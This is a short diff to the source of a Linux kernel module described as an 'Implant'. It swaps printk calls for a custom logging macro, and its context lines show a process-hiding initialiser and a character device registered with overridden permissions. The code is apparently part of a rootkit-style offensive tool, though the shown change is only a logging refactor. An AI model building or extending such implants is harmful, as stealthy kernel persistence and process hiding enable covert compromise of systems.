@@ -8,6 +8,7 @@
 
 #include "hide_proc.h"
 #include "commands.h"
+#include "log.h"
 
 MODULE_DESCRIPTION("Implant");
 MODULE_AUTHOR("sc");
@@ -94,7 +95,7 @@ static int __init implant_init(void)
 {
 	int ret = 0;
 
-	printk(KERN_INFO "%s: Loaded\n", THIS_MODULE->name);
+	IMLOG_INFO("Loaded\n");
 
 	ret = hide_proc_init();
 
@@ -108,15 +109,14 @@ static int __init implant_init(void)
 		goto err;
 	}
 
-	printk(KERN_INFO "%s: Registered with major %d\n", THIS_MODULE->name,
-	       implant_major);
+	IMLOG_INFO("Registered with major %d\n", implant_major);
 
 	implant_class = class_create(THIS_MODULE, IMPLANT_CLASS_NAME);
 	if (IS_ERR(implant_class)) {
 		ret = PTR_ERR(implant_class);
 		goto err_unreg_dev;
 	}
-	printk(KERN_INFO "%s: Device class registered\n", THIS_MODULE->name);
+	IMLOG_INFO("Device class registered\n");
 	/* override permission */
 	implant_class->devnode = implant_devnode;
 
@@ -127,7 +127,7 @@ static int __init implant_init(void)
 		ret = PTR_ERR(implant_device);
 		goto err_destroy_class;
 	}
-	printk(KERN_INFO "%s: Device class created\n", THIS_MODULE->name);
+	IMLOG_INFO("Device class created\n");
 
 	return 0;
 
@@ -147,7 +147,7 @@ static void __exit implant_exit(void)
 	class_destroy(implant_class);
 	unregister_chrdev(implant_major, IMPLANT_DEVICE_NAME);
 
-	printk(KERN_INFO "%s: Unloaded\n", THIS_MODULE->name);
+	IMLOG_INFO("Unloaded\n");
 }
 
 module_init(implant_init);
